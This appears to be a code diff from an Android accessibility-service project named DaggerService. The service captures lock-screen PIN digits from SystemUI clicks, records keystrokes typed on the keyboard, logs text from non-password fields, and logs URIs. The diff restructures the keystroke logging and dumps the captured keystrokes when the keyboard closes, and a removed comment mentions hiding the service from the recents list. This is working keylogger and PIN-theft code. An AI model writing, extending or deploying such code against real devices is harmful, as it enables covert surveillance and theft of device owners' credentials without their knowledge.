@@ -42,9 +42,7 @@ class DaggerService : AccessibilityService() {
             Log.d(TAG, "Pin recorded: $pin")
         })
 
-        keyLogger = KeyLogger(fun(word: String) {
-            Log.d(TAG, "Word recorded: $word")
-        })
+        keyLogger = KeyLogger()
         receiver = ScreenStateReceiver()
     }
 
@@ -54,15 +52,39 @@ class DaggerService : AccessibilityService() {
     override fun onAccessibilityEvent(event: AccessibilityEvent) {
         logEvent(event, event.toString())
         Log.d(TAG, "Active app: " + event.packageName)
-        when (event.eventType) {
-            AccessibilityEvent.TYPE_VIEW_CLICKED -> {
-                if (event.packageName == Config.SYSTEMUI_PACKAGE_NAME) {
-                    logEvent(event, event.className.toString())
-                    // This is a PIN, let's record it.
-                    pinRecorder.appendPinDigit(event.text.toString())
+
+        when (event.packageName) {
+            Config.SYSTEMUI_PACKAGE_NAME -> {
+                when (event.eventType) {
+                    AccessibilityEvent.TYPE_VIEW_CLICKED -> {
+                        logEvent(event, event.className.toString())
+                        // This is a PIN, let's record it.
+                        pinRecorder.appendPinDigit(event.text.toString())
+                    }
                 }
             }
 
+            Config.KEYBOARD_PACKAGE_NAME -> {
+                when (event.eventType) {
+                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                        val source = event.source
+                        val keystroke = source?.text?.toString()
+                        if (keystroke != null) {
+                            keyLogger.recordKeystroke(keystroke, event.eventTime)
+                        }
+                    }
+
+                    AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
+                        if (event.text?.toString()?.toLowerCase() == Config.KEYBOARD_DISMISSED_TEXT) {
+                            val keystrokes = keyLogger.toString()
+                            Log.d(TAG, "Got keystrokes: $keystrokes")
+                        }
+                    }
+                }
+            }
+        }
+
+        when (event.eventType) {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                 // This event type is fired when text is entered in any EditText that is not a
                 // password.
@@ -80,23 +102,6 @@ class DaggerService : AccessibilityService() {
                 }
                 for (uri in event.uris()) {
                     logEvent(event, "URI detected: $uri")
-                }
-            }
-
-            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
-                if (event.packageName == Config.SYSTEMUI_PACKAGE_NAME && event.className.contains("recent", true)) {
-                    // TODO: Remove AccessibilityService from recents list.
-                    Log.d(TAG, "In recent events.")
-                }
-            }
-
-            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
-                if (event.packageName == Config.KEYBOARD_PACKAGE_NAME) {
-                    val source = event.source
-                    val keystroke = source?.text?.toString()
-                    if (keystroke != null) {
-                        keyLogger.recordKeystroke(keystroke, event.eventTime)
-                    }
                 }
             }
         }
